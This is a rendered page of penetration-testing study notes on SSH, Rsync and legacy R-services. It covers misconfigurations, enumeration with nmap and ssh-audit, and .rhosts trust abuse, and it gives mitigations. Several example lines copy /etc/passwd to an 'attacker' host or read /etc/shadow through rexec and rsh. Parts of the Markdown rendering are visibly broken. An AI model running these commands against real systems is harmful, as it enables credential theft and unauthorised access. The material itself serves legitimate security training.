+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Takeaways
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#r-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      R-Services
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#r-services-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      R-Services Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key-features-of-r-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Features of R-Services
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frequently-used-r-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frequently Used R-Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#commonly-abused-r-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Commonly Abused R-Commands
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Commonly Abused R-Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-rcp-remote-copy" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. rcp (Remote Copy)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-rexec-remote-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. rexec (Remote Execution)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-rlogin-remote-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. rlogin (Remote Login)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-rsh-remote-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. rsh (Remote Shell)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#penetration-testing-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Penetration Testing Tips
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scanning-for-r-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scanning for R-Services
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key-takeaways_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Takeaways
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-control-trusted-relationships" class="md-nav__link">
+    <span class="md-ellipsis">
+      Access Control &amp; Trusted Relationships
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Access Control & Trusted Relationships">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#overview_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication Methods
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Syntax
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#logging-in-using-rlogin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Logging in Using Rlogin
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-authenticated-users-using-rwho" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listing Authenticated Users Using Rwho
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-authenticated-users-using-rusers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listing Authenticated Users Using Rusers
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Thoughts
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Linux Remote Management Protocols</h1>
+
+<blockquote>
+<p>[!tip]- Tips
+Write tips here</p>
+</blockquote>
+<h3 id="references">References</h3>
+<ul>
+<li>Layered Enumeration Framework Guide</li>
+<li>Comprehensive OSCP Enumeration Strategies</li>
+</ul>
+<h3 id="linux-remote-management-protocols"><strong>Linux Remote Management Protocols</strong></h3>
+<h4 id="overview"><strong>Overview</strong></h4>
+<p>Remote management of Linux servers is essential for efficient troubleshooting and system administration. By using protocols and applications designed for remote management, we can interact with servers from anywhere without being physically present. These tools also become targets for attackers, especially if misconfigured, making their secure setup and understanding critical for penetration testers.</p>
+<hr />
+<h4 id="secure-shell-ssh"><strong>Secure Shell (SSH)</strong></h4>
+<ul>
+<li><strong>Purpose</strong>: SSH allows encrypted, direct communication between two systems over <strong>TCP port 22</strong>.</li>
+<li><strong>Advantages</strong>:<ul>
+<li>Prevents data interception by third parties.</li>
+<li>Universally supported across major operating systems (Linux, macOS, Windows).</li>
+<li>Native to Unix-based systems and open-source on Linux as <strong>OpenSSH</strong>.</li>
+</ul>
+</li>
+<li><strong>SSH Protocol Versions</strong>:<ul>
+<li><strong>SSH-1</strong>: Vulnerable to <strong>Man-in-the-Middle (MITM)</strong> attacks.</li>
+<li><strong>SSH-2</strong>: Enhanced encryption, speed, stability, and security.</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h4 id="use-cases"><strong>Use Cases</strong></h4>
+<ol>
+<li><strong>Remote Host Management</strong>: Command-line or GUI.</li>
+<li><strong>File Transfers</strong>.</li>
+<li><strong>Port Forwarding</strong>.</li>
+</ol>
+<hr />
+<h4 id="authentication-methods-in-openssh"><strong>Authentication Methods in OpenSSH</strong></h4>
+<ol>
+<li>Password Authentication.</li>
+<li>Public-Key Authentication.</li>
+<li>Host-Based Authentication.</li>
+<li>Keyboard Authentication.</li>
+<li>Challenge-Response Authentication.</li>
+<li>GSSAPI Authentication.</li>
+</ol>
+<p><strong>Focus</strong>: Public-Key Authentication.</p>
+<hr />
+<h3 id="public-key-authentication"><strong>Public-Key Authentication</strong></h3>
+<ul>
+<li>
+<p><strong>Key Pair Setup</strong>:</p>
+<ul>
+<li><strong>Private Key</strong>: Stored securely on the client device, protected with a <strong>passphrase</strong>.</li>
+<li><strong>Public Key</strong>: Stored on the server.</li>
+<li>
+<p><strong>Authentication Steps</strong>:</p>
+</li>
+<li>
+<p><strong>Server Verification</strong>:</p>
+<ul>
+<li>Server sends an encrypted certificate to the client.</li>
+<li>
+<p>Client confirms it matches the trusted server.</p>
+<ol>
+<li><strong>Client Authentication</strong>:</li>
+</ol>
+</li>
+<li>
+<p>Server sends a cryptographic challenge encrypted with the public key.</p>
+</li>
+<li>Client solves it using the private key and returns the solution.</li>
+<li><strong>Benefits</strong>:</li>
+</ul>
+</li>
+<li>
+<p>Passphrase entered once per session for access to multiple servers.</p>
+</li>
+<li>Prevents unauthorized use if the client machine is compromised.</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h4 id="default-configuration-of-openssh"><strong>Default Configuration of OpenSSH</strong></h4>
+<ul>
+<li>The <code>sshd_config</code> file governs OpenSSH server behavior.</li>
+<li>By default, it includes <strong>X11 forwarding</strong>, which had a command injection vulnerability in <strong>version 7.2p1</strong> (2016).</li>
+<li><strong>Recommendation</strong>: Avoid GUIs for server management and review configurations to minimize vulnerabilities.</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span>/etc/ssh/sshd_config<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;#&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;/^\s*$/d&#39;</span>
+</code></pre></div>
+- <strong><code>cat /etc/ssh/sshd_config</code></strong>:<br />
+    This command reads and outputs the content of the SSH configuration file.</p>
+<ul>
+<li>
+<p><strong><code>| grep -v "#"</code></strong>:<br />
+    The <code>grep</code> command with the <code>-v</code> flag filters out lines that contain a <code>#</code>, which are comments in the configuration file.</p>
+<ul>
+<li><code>-v</code>: Invert match, meaning exclude lines matching the pattern.</li>
+<li><code>#</code>: Matches lines with <code>#</code> anywhere, which are treated as comments.</li>
+<li>
+<p><strong><code>| sed -r '/^\s*$/d'</code></strong>:<br />
+This part uses <code>sed</code> (stream editor) to remove blank lines.</p>
+</li>
+<li>
+<p><code>-r</code>: Enables extended regular expressions for the <code>sed</code> command.</p>
+</li>
+<li><code>/^\s*$/</code>: Matches lines that contain only whitespace (or are completely empty).<ul>
+<li><code>^</code>: Beginning of the line.</li>
+<li><code>\s*</code>: Zero or more whitespace characters.</li>
+<li><code>$</code>: End of the line.</li>
+</ul>
+</li>
+<li><code>d</code>: Deletes the matched lines.</li>
+</ul>
+<hr />
+<h2 id="dangerous-settings">Dangerous Settings</h2>
+</li>
+</ul>
+<p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Setting</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PasswordAuthentication yes</code></td>
+<td>Allows password-based authentication.</td>
+</tr>
+<tr>
+<td><code>PermitEmptyPasswords yes</code></td>
+<td>Allows the use of empty passwords.</td>
+</tr>
+<tr>
+<td><code>PermitRootLogin yes</code></td>
+<td>Allows to log in as the root user.</td>
+</tr>
+<tr>
+<td><code>Protocol 1</code></td>
+<td>Uses an outdated version of encryption.</td>
+</tr>
+<tr>
+<td><code>X11Forwarding yes</code></td>
+<td>Allows X11 forwarding for GUI applications.</td>
+</tr>
+<tr>
+<td><code>AllowTcpForwarding yes</code></td>
+<td>Allows forwarding of TCP ports.</td>
+</tr>
+<tr>
+<td><code>PermitTunnel</code></td>
+<td>Allows tunneling.</td>
+</tr>
+<tr>
+<td><code>DebianBanner yes</code></td>
+<td>Displays a specific banner when logging in.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="footprinting-the-service">Footprinting the Service</h2>
+<p>One of the tools we can use to fingerprint the SSH server is <a href="https://github.com/jtesta/ssh-audit">ssh-audit</a>. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/jtesta/ssh-audit.git<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>ssh-audit
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>./ssh-audit.py<span class="w"> </span>&lt;ip&gt;
+</code></pre></div></p>
+<h2 id="change-authentication-method">Change Authentication Method</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ssh<span class="w"> </span>-v<span class="w"> </span>cry01t2@&lt;ip&gt;
+</code></pre></div>
+For potential brute-force attacks, we can specify the authentication method with the SSH client option <code>PreferredAuthentications</code>.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>-v<span class="w"> </span>cry0l1t3@10.129.14.132<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password
+</code></pre></div>
+ [[Rsync]] is a powerful and efficient tool for copying files both locally and remotely. It is widely used for <strong>backups</strong>, <strong>file mirroring</strong>, and <strong>synchronization</strong> due to its ability to minimize network usage through a <strong>delta-transfer algorithm</strong>.</p>
+<h3 id="scanning-for-rsync">Scanning for Rsync</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">873</span><span class="w"> </span>&lt;ip&gt;
+</code></pre></div>
+<h3 id="probing-for-accessible-shares">Probing for Accessible Shares</h3>
+<p>We can next probe the service a bit to see what we can gain access to.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc<span class="w"> </span>-nv<span class="w"> </span>&lt;ip&gt;<span class="w"> </span><span class="m">873</span>
+</code></pre></div></p>
+<h3 id="enumerating-an-open-share">Enumerating an Open Share</h3>
+<p>Here we can see a share called <code>dev</code>, and we can enumerate it further.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>rsync<span class="w"> </span>-av<span class="w"> </span>--list-only<span class="w"> </span>rsync://127.0.01/dev
+</code></pre></div></p>
+<p>From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command <code>rsync -av rsync://127.0.0.1/dev</code>. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the <code>-e ssh</code> flag, or <code>-e "ssh -p2222"</code> if a non-standard port is in use for SSH. This <a href="https://phoenixnap.com/kb/how-to-rsync-over-ssh">guide</a> is helpful for understanding the syntax for using Rsync over SSH.</p>
+<h3 id="key-takeaways"><strong>Key Takeaways</strong></h3>
+<ul>
+<li>SSH is vital for secure remote management but must be configured correctly to prevent exploitation.</li>
+<li>Public-key authentication offers enhanced security over password-based methods.</li>
+<li>Default configurations may include unnecessary features (e.g., X11 forwarding) that should be evaluated and adjusted.</li>
+</ul>
+<p><strong>Exam Priority</strong>: High<br />
+<strong>Techniques/Tools</strong>: SSH, <code>sshd_config</code>, Key Management<br />
+<strong>Tags</strong>: #Linux #SSH #RemoteManagement</p>
+<h3 id="r-services">R-Services</h3>
+<h3 id="r-services-overview"><strong>R-Services Overview</strong></h3>
+<p>R-Services are legacy protocols and commands used for remote access and execution between Unix hosts over TCP/IP. While largely replaced by SSH due to significant security flaws, R-Services may still be encountered in penetration tests, especially on older systems. They rely on plaintext communication, making them vulnerable to attacks like <strong>Man-in-the-Middle (MITM)</strong>.</p>
+<hr />
+<h3 id="key-features-of-r-services"><strong>Key Features of R-Services</strong></h3>
+<ul>
+<li><strong>Ports</strong>: Operate on ports <strong>512</strong>, <strong>513</strong>, and <strong>514</strong>.</li>
+<li><strong>Transport</strong>: Utilize TCP for communication.</li>
+<li><strong>Security Risks</strong>: Data, including passwords, is transmitted in <strong>plaintext</strong>, enabling easy interception.</li>
+<li><strong>Common OS</strong>: Found on older systems like <strong>Solaris</strong>, <strong>HP-UX</strong>, and <strong>AIX</strong>.</li>
+<li><strong>Programs</strong>: Accessed using a suite of commands collectively known as <strong>r-commands</strong>.</li>
+</ul>
+<hr />
+<h3 id="frequently-used-r-commands"><strong>Frequently Used R-Commands</strong></h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Service Daemon</strong></th>
+<th><strong>Port</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>rcp</strong></td>
+<td>rshd</td>
+<td>514</td>
+<td>Remote file copying between Unix hosts. Similar to <code>scp</code>.</td>
+</tr>
+<tr>
+<td><strong>rexec</strong></td>
+<td>rexecd</td>
+<td>512</td>
+<td>Executes commands on a remote host with authentication.</td>
+</tr>
+<tr>
+<td><strong>rlogin</strong></td>
+<td>rlogind</td>
+<td>513</td>
+<td>Provides terminal access to a remote host.</td>
+</tr>
+<tr>
+<td><strong>rsh</strong></td>
+<td>rshd</td>
+<td>514</td>
+<td>Executes commands on a remote host without login.</td>
+</tr>
+<tr>
+<td><strong>rstat</strong></td>
+<td>rpc.rstatd</td>
+<td>512/UDP</td>
+<td>Reports system performance statistics.</td>
+</tr>
+<tr>
+<td><strong>ruptime</strong></td>
+<td>rstatd</td>
+<td>512</td>
+<td>Displays uptime and load averages of remote hosts.</td>
+</tr>
+<tr>
+<td><strong>rwho</strong></td>
+<td>rwhod</td>
+<td>513/UDP</td>
+<td>Shows users currently logged into a remote host.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="commonly-abused-r-commands"><strong>Commonly Abused R-Commands</strong></h3>
+<h4 id="1-rcp-remote-copy"><strong>1. rcp (Remote Copy)</strong></h4>
+<ul>
+<li><strong>Usage</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>rcp<span class="w"> </span>&lt;source_file&gt;<span class="w"> </span>&lt;remote_user&gt;@&lt;remote_host&gt;:&lt;destination_path&gt;
+</code></pre></div>
+<ul>
+<li><strong>Abuse Potential</strong>: If misconfigured, files can be copied without authentication or access restrictions.</li>
+<li><strong>Example</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>rcp<span class="w"> </span>/etc/passwd<span class="w"> </span>attacker@192.168.1.10:/tmp
+</code></pre></div>
+<h4 id="2-rexec-remote-execution"><strong>2. rexec (Remote Execution)</strong></h4>
+<ul>
+<li><strong>Usage</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>rexec<span class="w"> </span>&lt;remote_host&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;username&gt;<span class="w"> </span>&lt;command&gt;
+</code></pre></div>
+<ul>
+<li><strong>Abuse Potential</strong>: Credentials are sent in plaintext. An attacker could intercept credentials and commands.</li>
+<li><strong>Example</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>rexec<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>cat<span class="w"> </span>/etc/shadow
+</code></pre></div>
+<h4 id="3-rlogin-remote-login"><strong>3. rlogin (Remote Login)</strong></h4>
+<ul>
+<li><strong>Usage</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>rlogin<span class="w"> </span>&lt;remote_host&gt;
+</code></pre></div>
+<ul>
+<li><strong>Abuse Potential</strong>: If <code>.rhosts</code> is improperly configured, attackers can log in without a password.</li>
+<li><strong>Example</strong>:</li>
+</ul>
+<p><code>rlogin -l root 192.168.1.10</code></p>
+<h4 id="4-rsh-remote-shell"><strong>4. rsh (Remote Shell)</strong></h4>
+<ul>
+<li><strong>Usage</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>rsh<span class="w"> </span>&lt;remote_host&gt;<span class="w"> </span>&lt;command&gt;
+</code></pre></div>
+<ul>
+<li><strong>Abuse Potential</strong>: Executes commands without requiring a password if <code>.rhosts</code> allows it.</li>
+<li><strong>Example</strong>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>rsh<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span><span class="s1">&#39;cat /etc/passwd&#39;</span>
+</code></pre></div>
+<hr />
+<h3 id="penetration-testing-tips"><strong>Penetration Testing Tips</strong></h3>
+<ol>
+<li>
+<p><strong>Check for Open Ports</strong>:<br />
+    Scan for ports 512, 513, and 514 using <code>nmap</code>.</p>
+<p>```bash
+nmap -p 512-514 <target_ip>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>2. **Enumerate Services**:  
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    Use tools like **rpcinfo** or **rsh** to gather service information.
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    ```bash
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>rpcinfo -p &lt;target_ip&gt;
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>Exploit Misconfigured <code>.rhosts</code> Files</strong>:<br />
+<code>.rhosts</code> files define trusted hosts and users. Weak configurations allow remote access without passwords.</p>
+<ul>
+<li>Look for <code>.rhosts</code> files in user home directories:
+    ```bash
+find / -name ".rhosts" 2&gt;/dev/null
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>4. **Exploit Trusted Host Relationships**:  
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>    If `.rhosts` trusts your machine, you can spoof your hostname and execute commands. Example with **rsh**:
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    ```bash
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    rsh -l root &lt;target_host&gt; &#39;cat /etc/shadow&#39;
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    ```
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>5. **Intercept Credentials**:  
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>    Use tools like Wireshark to capture plaintext credentials during R-Command usage.
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>### **Mitigation and Recommendations**
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>- Replace R-Services with **SSH** for secure remote access.
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>- Disable unnecessary services in `/etc/services`.
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>- Remove `.rhosts` files or restrict them strictly.
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>- Use network firewalls to block ports **512–514**.
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>
+<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>
+<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>|**Command**|**Service Daemon**|**Port**|**Transport Protocol**|**Description**|
+<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>|---|---|---|---|---|
+<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>|`rcp`|`rshd`|514|TCP|Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the `cp` command on Linux but provides `no warning to the user for overwriting existing files on a system`.|
+<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>|`rsh`|`rshd`|514|TCP|Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files for validation.|
+<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>|`rexec`|`rexecd`|512|TCP|Enables a user to run shell commands on a remote machine. Requires authentication through the use of a `username` and `password` through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.|
+<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>
+<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>#### /etc/hosts.equiv
+<a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a>
+<a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a>```shell
+<a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a>cat /etc/hosts.equiv
+</code></pre></div></li>
+</ul>
+</li>
+</ol>
+<p>Now that we have a basic understanding of <code>r-commands</code>, let's do some quick footprinting using <code>Nmap</code> to determine if all necessary ports are open.</p>
+<h3 id="scanning-for-r-services">Scanning for R-Services</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">512</span>,513,514<span class="w"> </span>&lt;ip&gt;
+</code></pre></div>
+<h3 id="key-takeaways_1"><strong>Key Takeaways</strong></h3>
+<ul>
+<li><strong>R-Services</strong> are inherently insecure due to plaintext communication and lack of modern encryption.</li>
+<li>Misconfigurations like weak <code>.rhosts</code> files provide attackers an easy entry point.</li>
+<li>Penetration testers should prioritize <strong>port scanning</strong>, <strong>service enumeration</strong>, and <strong><code>.rhosts</code> abuse</strong> when encountering R-Services.</li>
+</ul>
+<p><strong>Exam Priority</strong>: Moderate<br />
+<strong>Tags</strong>: #RServices #PenetrationTesting #LegacyProtocols</p>
+<h3 id="access-control-trusted-relationships"><strong>Access Control &amp; Trusted Relationships</strong></h3>
+<hr />
+<h4 id="overview_1"><strong>Overview</strong></h4>
+<p>R-services have weak access control mechanisms that rely heavily on trust. This design makes them inherently insecure and was one of the primary reasons SSH replaced them. Trusted relationships between systems and users are managed through specific configuration files: <code>/etc/hosts.equiv</code> and <code>.rhosts</code>.</p>
+<hr />
+<h4 id="authentication-methods"><strong>Authentication Methods</strong></h4>
+<ol>
+<li>
+<p><strong>Pluggable Authentication Modules (PAM):</strong></p>
+<ul>
+<li>Used by r-services for authenticating users.</li>
+<li>Modular and flexible, but often bypassed due to trusted relationships.</li>
+<li>
+<p><strong>Trusted Relationship Files:</strong></p>
+</li>
+<li>
+<p><strong><code>/etc/hosts.equiv</code>:</strong></p>
+<ul>
+<li>System-wide trust file.</li>
+<li>Applies to all users unless overridden by <code>.rhosts</code>.</li>
+</ul>
+</li>
+<li><strong><code>~/.rhosts</code>:</strong><ul>
+<li>User-specific trust file.</li>
+<li>Overrides <code>/etc/hosts.equiv</code> for the corresponding user.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h4 id="file-syntax"><strong>File Syntax</strong></h4>
+<ul>
+<li>
+<p><strong>Format:</strong>
+    ```bash
+hostname [username]
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>    - **`hostname`**: Specifies the trusted host (can be an IP or hostname).
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>    - **`username`**: Optional. Specifies the trusted user on that host.
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>- **Examples:**
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    - Trust all users from a specific host:
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>        ```bash
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>trusted-host.example.com
+</code></pre></div></p>
+<ul>
+<li>
+<p>Trust a specific user from a specific host:</p>
+<p>```bash
+trusted-host.example.com trusteduser
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>    - Trust all users from any host (`+` is dangerous):
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>        `+`
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>---
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>#### **Security Risks**
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>1. **Weak Authentication:**
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>    - Authentication is based solely on the trust established in the files.
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>    - No password or additional verification is required.
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>2. **Man-in-the-Middle (MITM) Attacks:**
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>    - Unencrypted communication can be intercepted.
